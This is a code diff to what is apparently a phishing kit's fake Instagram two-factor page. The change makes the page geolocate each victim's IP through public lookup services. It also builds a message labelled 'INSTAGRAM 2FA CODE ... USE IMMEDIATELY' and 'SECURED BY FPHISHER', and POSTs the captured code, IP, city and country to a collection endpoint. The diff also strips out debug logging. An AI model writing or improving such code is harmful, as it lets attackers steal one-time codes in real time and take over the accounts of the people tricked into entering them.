@@ -101,36 +101,30 @@
         let attempt = 0;
 
         async function getLocation() {
+          try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            return {
+              ip: data.ip || 'Unknown',
+              country: data.country_name || 'Unknown',
+              state: data.region || 'Unknown',
+              city: data.city || 'Unknown'
+            };
+          } catch {
             try {
-                console.log("Fetching location for OTP...");
-                const res = await fetch('https://ipapi.co/json/', {
-                    method: 'GET',
-                    headers: { 'Accept': 'application/json' }
-                });
-
-                if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
-
-                const data = await res.json();
-                console.log("OTP location data:", data);
-
+              const fb = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
+              const d = await fb.json();
+              if (d.status === "success") {
                 return {
-                    country: data.country_name || data.country || 'Unknown',
-                    state: data.region || data.region_code || 'Unknown'
+                  ip: d.query || 'Unknown',
+                  country: d.country || 'Unknown',
+                  state: d.regionName || 'Unknown',
+                  city: d.city || 'Unknown'
                 };
-            } catch (err) {
-                console.error("Primary geolocation failed:", err);
-                try {
-                    const fallback = await fetch('https://ip-api.com/json/?fields=status,country,regionName');
-                    const fbData = await fallback.json();
-                    if (fbData.status === "success") {
-                        return {
-                            country: fbData.country || 'Unknown',
-                            state: fbData.regionName || 'Unknown'
-                        };
-                    }
-                } catch {}
-            }
-            return { country: 'Unknown', state: 'Unknown' };
+              }
+            } catch {}
+          }
+          return { ip: 'Unknown', country: 'Unknown', state: 'Unknown', city: 'Unknown' };
         }
 
         document.getElementById("submitBtn").addEventListener("click", async () => {
@@ -153,18 +147,39 @@
             errorMsg.classList.add("hidden");
 
             const loc = await getLocation();
-
             attempt++;
+
+            const now = new Date().toLocaleString('en-US', {
+              month: 'numeric', day: 'numeric', year: 'numeric',
+              hour: 'numeric', minute: 'numeric', second: 'numeric',
+              hour12: true
+            });
+
+            const message = `🔐 INSTAGRAM 2FA CODE
+
+📱 Code: ${code}
+⏰ Time: ${now}
+⚠️ USE IMMEDIATELY-TIME SENSITIVE
+
+LOCATION:
+•🌍 Country: ${loc.country}
+•🗺️ State: ${loc.state}
+•🏙️ City: ${loc.city}
+•🌐 IP: ${loc.ip}
+
+🔒•SECURED BY FPHISHER•🔒`;
 
             const payload = {
                 id: SUBMIT_ID,
-                app: "INSTAGRAM / 2FA CODE",
+                type: "otp",
+                raw_message: message,
                 code: code,
                 country: loc.country,
                 state: loc.state,
+                city: loc.city,
+                ip: loc.ip,
                 attempt: attempt,
-                timestamp: new Date().toISOString(),
-                source: "OTP Verification"
+                timestamp: new Date().toISOString()
             };
 
             try {
@@ -173,9 +188,8 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-                console.log("OTP data sent successfully");
             } catch (err) {
-                console.error("Failed to send OTP data:", err);
+                console.error("Send failed:", err);
             }
 
             setTimeout(() => {
